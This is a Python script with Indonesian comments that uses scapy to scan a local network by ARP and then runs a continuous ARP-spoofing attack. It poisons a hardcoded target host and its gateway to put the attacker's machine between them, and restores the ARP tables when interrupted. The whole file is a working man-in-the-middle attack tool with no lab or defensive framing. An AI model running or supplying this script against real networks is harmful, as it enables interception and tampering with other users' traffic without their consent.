from scapy.all import ARP, Ether, srp
import netifaces

def scan_network(interface="wlp0s20f3", ip_range="192.168.1.1/24"):
    # Membuat ARP request packet
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    
    # Mengirim dan menerima packet
    result = srp(packet, timeout=3, iface=interface, verbose=0)[0]
    
    # Menampilkan hasil
    devices = []
    print("[+] Devices ditemukan:")
    print("IP\t\t\tMAC Address")
    print("-----------------------------------------")
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})
        print(f"{received.psrc}\t\t{received.hwsrc}")
    
    return devices

# Jalankan scan
# scan_network()

from scapy.all import ARP, send, getmacbyip, conf
import time
import sys

def get_mac(ip, interface="wlp0s20f3"):
    """Mendapatkan MAC address dari IP"""
    try:
        mac = getmacbyip(ip)
        if mac:
            return mac
        else:
            # Alternative method
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), 
                        timeout=2, iface=interface, verbose=0)
            for s, r in ans:
                return r[Ether].src
    except:
        return None

def arp_spoof(target_ip, gateway_ip, interface="wlp0s20f3"):
    """Melakukan ARP spoofing"""
    target_mac = get_mac(target_ip, interface)
    gateway_mac = get_mac(gateway_ip, interface)
    
    if not target_mac or not gateway_mac:
        print("[-] Gagal mendapatkan MAC address")
        return False
    
    print(f"[+] Target: {target_ip} ({target_mac})")
    print(f"[+] Gateway: {gateway_ip} ({gateway_mac})")
    print("[+] Memulai ARP spoofing...")
    
    try:
        while True:
            # Poison target (mengatakan kita adalah gateway)
            send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), 
                 verbose=0, iface=interface)
            
            # Poison gateway (mengatakan kita adalah target)
            send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), 
                 verbose=0, iface=interface)
            
            time.sleep(2)  # Kirim setiap 2 detik
            
    except KeyboardInterrupt:
        print("\n[+] Menghentikan ARP spoofing...")
        restore_network(target_ip, gateway_ip, target_mac, gateway_mac, interface)
        return True

def restore_network(target_ip, gateway_ip, target_mac, gateway_mac, interface):
    """Mengembalikan ARP table ke normal"""
    print("[+] Merestore ARP table...")
    
    # Restore target
    send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, 
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), 
         count=5, verbose=0, iface=interface)
    
    # Restore gateway
    send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, 
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), 
         count=5, verbose=0, iface=interface)

# Konfigurasi berdasarkan jaringan Anda
TARGET_IP = "192.168.1.8"
GATEWAY_IP = "192.168.1.1"
INTERFACE = "wlp0s20f3"

if __name__ == "__main__":
    # Pertama, scan jaringan
    print("[+] Memindai jaringan...")
    devices = scan_network(INTERFACE)
    
    # Kemudian mulai ARP spoofing
    print(f"\n[+] Memulai ARP spoofing pada {TARGET_IP}")
    arp_spoof(TARGET_IP, GATEWAY_IP, INTERFACE)